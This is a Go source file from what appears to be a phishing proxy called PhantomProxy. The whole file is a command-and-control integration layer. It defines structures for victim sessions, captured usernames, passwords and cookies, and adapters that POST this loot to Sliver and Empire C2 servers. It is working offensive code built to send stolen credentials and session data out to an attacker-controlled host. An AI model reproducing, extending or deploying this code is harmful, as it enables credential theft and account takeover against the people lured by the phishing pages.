// Package c2 - C2 Integration Manager
package c2

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"

	"go.uber.org/zap"
)

// Adapter интерфейс C2 адаптера
type Adapter interface {
	Name() string
	IsAvailable(ctx context.Context) bool
	SendSession(ctx context.Context, data *SessionData) error
	SendCredentials(ctx context.Context, creds *Credentials, metadata map[string]string) error
	HealthCheck(ctx context.Context) error
}

// SessionData данные сессии
type SessionData struct {
	SessionID   string      `json:"session_id"`
	VictimIP    string      `json:"victim_ip"`
	Credentials *Credentials `json:"credentials"`
	Cookies     []*Cookie   `json:"cookies"`
	PhishletID  string      `json:"phishlet_id"`
	UserAgent   string      `json:"user_agent"`
	TargetURL   string      `json:"target_url"`
}

// Credentials креденшалы
type Credentials struct {
	ID       string `json:"id"`
	Username string `json:"username"`
	Password string `json:"password"`
}

// Cookie cookie
type Cookie struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Domain string `json:"domain"`
}

// Manager менеджер C2
type Manager struct {
	mu        sync.RWMutex
	logger    *zap.Logger
	adapters  []Adapter
	enabled   bool
}

// NewManager создает C2 менеджер
func NewManager(logger *zap.Logger, adapters []Adapter) *Manager {
	return &Manager{
		logger:   logger,
		adapters: adapters,
		enabled:  true,
	}
}

// AddAdapter добавляет адаптер
func (m *Manager) AddAdapter(adapter Adapter) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.adapters = append(m.adapters, adapter)
	m.logger.Info("C2 adapter added", zap.String("name", adapter.Name()))
}

// SendSession отправляет сессию во все C2
func (m *Manager) SendSession(ctx context.Context, data *SessionData) error {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if !m.enabled {
		return nil
	}

	for _, adapter := range m.adapters {
		if adapter.IsAvailable(ctx) {
			if err := adapter.SendSession(ctx, data); err != nil {
				m.logger.Warn("Failed to send session to C2",
					zap.String("adapter", adapter.Name()),
					zap.Error(err))
			} else {
				m.logger.Info("Session sent to C2",
					zap.String("adapter", adapter.Name()),
					zap.String("session", data.SessionID))
			}
		}
	}

	return nil
}

// SendCredentials отправляет креденшалы во все C2
func (m *Manager) SendCredentials(ctx context.Context, creds *Credentials, metadata map[string]string) error {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if !m.enabled {
		return nil
	}

	for _, adapter := range m.adapters {
		if adapter.IsAvailable(ctx) {
			if err := adapter.SendCredentials(ctx, creds, metadata); err != nil {
				m.logger.Warn("Failed to send credentials to C2",
					zap.String("adapter", adapter.Name()),
					zap.Error(err))
			} else {
				m.logger.Info("Credentials sent to C2",
					zap.String("adapter", adapter.Name()),
					zap.String("username", creds.Username))
			}
		}
	}

	return nil
}

// HealthCheck проверяет все C2
func (m *Manager) HealthCheck(ctx context.Context) map[string]bool {
	m.mu.RLock()
	defer m.mu.RUnlock()

	results := make(map[string]bool)
	for _, adapter := range m.adapters {
		results[adapter.Name()] = adapter.IsAvailable(ctx)
	}

	return results
}

// ListAdapters возвращает список адаптеров
func (m *Manager) ListAdapters() []string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	names := make([]string, len(m.adapters))
	for i, adapter := range m.adapters {
		names[i] = adapter.Name()
	}
	return names
}

// SliverAdapter Sliver C2
type SliverAdapter struct {
	config     *SliverConfig
	httpClient *http.Client
	logger     *zap.Logger
}

// SliverConfig конфигурация Sliver
type SliverConfig struct {
	Enabled       bool   `json:"enabled"`
	ServerURL     string `json:"server_url"`
	OperatorToken string `json:"operator_token"`
	CallbackHost  string `json:"callback_host"`
}

// NewSliverAdapter создает Sliver адаптер
func NewSliverAdapter(cfg *SliverConfig, logger *zap.Logger) *SliverAdapter {
	return &SliverAdapter{
		config: cfg,
		httpClient: &http.Client{Timeout: 30 * time.Second},
		logger: logger,
	}
}

func (a *SliverAdapter) Name() string { return "sliver" }

func (a *SliverAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.ServerURL == "" {
		return false
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/v1/version", nil)
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

func (a *SliverAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending session to Sliver",
		zap.String("session_id", data.SessionID))

	payload := map[string]interface{}{
		"type":        "credential",
		"protocol":    "https",
		"username":    data.VictimIP,
		"description": fmt.Sprintf("PhantomProxy Session: %s", data.PhishletID),
		"metadata": map[string]string{
			"session_id": data.SessionID,
			"phishlet":   data.PhishletID,
			"user_agent": data.UserAgent,
			"target_url": data.TargetURL,
			"callback":   a.config.CallbackHost,
		},
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequestWithContext(ctx, "POST",
		a.config.ServerURL+"/api/v1/loot", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("sliver API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("sliver API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Session sent to Sliver successfully")
	return nil
}

func (a *SliverAdapter) SendCredentials(ctx context.Context, creds *Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending credentials to Sliver",
		zap.String("username", creds.Username))

	payload := map[string]interface{}{
		"type":        "credential",
		"protocol":    "autofill",
		"username":    creds.Username,
		"password":    creds.Password,
		"description": "PhantomProxy Captured Credentials",
		"metadata":    metadata,
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequestWithContext(ctx, "POST",
		a.config.ServerURL+"/api/v1/loot", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("sliver API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("sliver API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Credentials sent to Sliver successfully")
	return nil
}

func (a *SliverAdapter) HealthCheck(ctx context.Context) error {
	if !a.IsAvailable(ctx) {
		return fmt.Errorf("sliver server not available")
	}
	return nil
}

// EmpireAdapter Empire C2
type EmpireAdapter struct {
	config     *EmpireConfig
	httpClient *http.Client
	logger     *zap.Logger
	token      string
}

// EmpireConfig конфигурация Empire
type EmpireConfig struct {
	Enabled   bool   `json:"enabled"`
	ServerURL string `json:"server_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Token     string `json:"token"`
}

// NewEmpireAdapter создает Empire адаптер
func NewEmpireAdapter(cfg *EmpireConfig, logger *zap.Logger) *EmpireAdapter {
	adapter := &EmpireAdapter{
		config: cfg,
		httpClient: &http.Client{Timeout: 30 * time.Second},
		logger: logger,
	}

	if cfg.Username != "" && cfg.Password != "" && cfg.Token == "" {
		adapter.login()
	}

	return adapter
}

func (a *EmpireAdapter) Name() string { return "empire" }

func (a *EmpireAdapter) login() error {
	payload := map[string]string{
		"username": a.config.Username,
		"password": a.config.Password,
	}

	jsonData, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", a.config.ServerURL+"/token", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("empire login failed: %w", err)
	}
	defer resp.Body.Close()

	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}

	a.token = result["access_token"]
	if a.token == "" {
		return fmt.Errorf("no token received from Empire")
	}

	a.logger.Info("Empire authentication successful")
	return nil
}

func (a *EmpireAdapter) setAuth(req *http.Request) {
	token := a.config.Token
	if a.token != "" {
		token = a.token
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
}

func (a *EmpireAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.ServerURL == "" {
		return false
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/version", nil)
	a.setAuth(req)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200
}

func (a *EmpireAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending session to Empire",
		zap.String("session_id", data.SessionID))

	body, _ := json.Marshal(map[string]interface{}{
		"session_id": data.SessionID,
		"victim_ip":  data.VictimIP,
		"phishlet":   data.PhishletID,
		"user_agent": data.UserAgent,
		"target_url": data.TargetURL,
		"type":       "phantomproxy_session",
	})

	req, _ := http.NewRequestWithContext(ctx, "POST",
		a.config.ServerURL+"/api/credentials", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setAuth(req)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("empire API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("empire API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Session sent to Empire successfully")
	return nil
}

func (a *EmpireAdapter) SendCredentials(ctx context.Context, creds *Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}

	a.logger.Info("Sending credentials to Empire",
		zap.String("username", creds.Username))

	body, _ := json.Marshal(map[string]interface{}{
		"username": creds.Username,
		"password": creds.Password,
		"type":     "plaintext",
		"origin":   "phantomproxy",
		"metadata": metadata,
	})

	req, _ := http.NewRequestWithContext(ctx, "POST",
		a.config.ServerURL+"/api/credentials", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	a.setAuth(req)

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("empire API error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("empire API error: status %d", resp.StatusCode)
	}

	a.logger.Info("Credentials sent to Empire successfully")
	return nil
}

func (a *EmpireAdapter) HealthCheck(ctx context.Context) error {
	if !a.IsAvailable(ctx) {
		return fmt.Errorf("empire server not available")
	}
	return nil
}
